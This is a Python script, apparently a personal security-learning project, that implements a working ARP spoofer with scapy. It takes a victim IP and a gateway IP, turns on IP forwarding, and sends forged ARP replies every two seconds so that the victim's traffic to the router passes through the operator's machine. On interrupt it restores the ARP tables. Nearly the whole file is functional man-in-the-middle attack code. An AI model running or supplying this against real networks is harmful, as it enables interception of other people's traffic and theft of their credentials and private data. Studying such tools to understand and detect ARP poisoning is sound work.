#!/usr/bin/env python3

# Author: Nikhil Sharma
# Created Date: 30-05-2020
# Last Updated: 09-06-2020
# Operating System: Linux and Mac
# Description: An arp spoofer. Routes the traffic between a client and a router through your machine.

# Import the necessary libraries
import scapy.layers.l2 as scapy
import scapy.all as scapy2
import optparse,time, subprocess


# Define a function to get user arguements
def get_arguements():
    # Creating an object of the class
    parser = optparse.OptionParser()
    # Expected arguement
    parser.add_option("-t", "--target", dest="target_ip", help="IP of the victim")
    parser.add_option("-g", "--gateway", dest="gateway_ip", help="IP of the router (default gateway IP)")
    # Returning the value and the arguements passed by the user to variables
    values = parser.parse_args()[0]
    # Checking to see user entered values for both interface and the mac
    if not values.target_ip:
        # Error Handling
        parser.error("[-] Please specify the target IP, use --help for more info")
    elif not values.gateway_ip:
        # Error Handling
        parser.error("[-] Please specify the gateway address, use --help for more info")
    return values


# Define a function get the MAC of the target
def get_mac(ip):
    # Create an object of ARP class to send out ARP requests to the 'ip' defined in the function call -> the arp request packet
    arp_request = scapy.ARP(pdst=ip)
    # Create an object of Ether class to broadcast a MAC address to all the clients -> the MAC broadcast packet
    mac_broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    # Combine the 2 packets into a single packet
    arp_request_broadcast = mac_broadcast/arp_request
    # Send the broadcast arp request packet into the network and receive responses (the answered lists is in the 0th index)
    answered_responses_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_responses_list[0][1].hwsrc


# Define a fuction to send the ARP
def spoof(target_ip, spoof_ip):
	# Get the target MAC id from the get_mac()
	target_mac = get_mac(target_ip) 
	# Create an ARP response packet to the victim
	response_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
	# Send the packet in air
	scapy2.send(response_packet, verbose=False)


# Define a function to restore the target's arp table
def restore(destination_ip, source_ip):
	# Create a response packet
	response_packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=get_mac(destination_ip), psrc=source_ip, hwsrc=get_mac(source_ip))
	# Send the packet 4 times -> to make sure that the arp table is corrected
	scapy2.send(response_packet, count=4)


# Send the packets to the victim and to the router
# Also handle the KeyboardInterrupt exception
values = get_arguements()
target_ip = values.target_ip
gateway_ip = values.gateway_ip

# Enable port forwarding 
subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
try:
	sent_packets_count = 0
	while True:
		spoof(target_ip, gateway_ip)
		spoof(gateway_ip, target_ip)
		sent_packets_count+=2
		# Dynamic printing -> print text on the same line, overwriting it
		print("\r[+]Packets sent:", sent_packets_count, end="")
		# Just so you don't overload the network with packets, give a 2 sec delay
		time.sleep(2)
except KeyboardInterrupt:
	print("\n[+] Interrupted by user.........Restoring ARP tables.........Please Wait!")
	restore(target_ip, gateway_ip)
	restore(gateway_ip, target_ip)